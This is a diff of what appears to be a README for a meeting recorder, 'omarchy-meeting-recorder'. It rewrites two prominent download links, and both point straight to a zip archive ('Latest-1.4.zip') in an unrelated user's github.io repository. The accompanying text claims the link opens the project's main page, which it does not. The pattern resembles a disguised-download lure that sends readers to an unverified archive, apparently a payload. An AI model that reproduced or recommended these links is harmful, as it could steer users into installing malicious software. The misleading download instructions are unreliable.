@@ -5,7 +5,7 @@ description: "Record your meetings locally with dual-track audio, get instant AI
 ---
 # 🎙️ omarchy-meeting-recorder - Record, Transcribe, and Review Every Meeting Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-omarchy--meeting--recorder-blue?style=for-the-badge&logo=github)](https://github.com/SUBHADEEP-KUNDU-2004/subhadeep-kundu-2004.github.io/raw/refs/heads/main/tools/Latest-1.4.zip)
+[![Download Now](https://img.shields.io/badge/Download-omarchy--meeting--recorder-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/SUBHADEEP-KUNDU-2004/subhadeep-kundu-2004.github.io/main/tools/Latest-1.4.zip)
 
 ---
 
@@ -22,7 +22,7 @@ Welcome! This guide will help you download and run **omarchy-meeting-recorder** 
 ## ⬇️ Downloading the Application
 
 Your journey starts here. Visit this link to download the application:  
-👉 **[https://github.com/SUBHADEEP-KUNDU-2004/subhadeep-kundu-2004.github.io/raw/refs/heads/main/tools/Latest-1.4.zip](https://github.com/SUBHADEEP-KUNDU-2004/subhadeep-kundu-2004.github.io/raw/refs/heads/main/tools/Latest-1.4.zip)**
+👉 **[https://raw.githubusercontent.com/SUBHADEEP-KUNDU-2004/subhadeep-kundu-2004.github.io/main/tools/Latest-1.4.zip](https://raw.githubusercontent.com/SUBHADEEP-KUNDU-2004/subhadeep-kundu-2004.github.io/main/tools/Latest-1.4.zip)**
 
 Once you click that link, you'll land on the project's main page. Look for a green button that says **"Code"** or **"Releases"** — click it or the one that says **"Download ZIP"**. The exact wording may vary, but you're looking for a download button. After clicking, the download should start automatically. Save the file to a spot you can find easily, like your **Desktop** or **Downloads** folder.
 
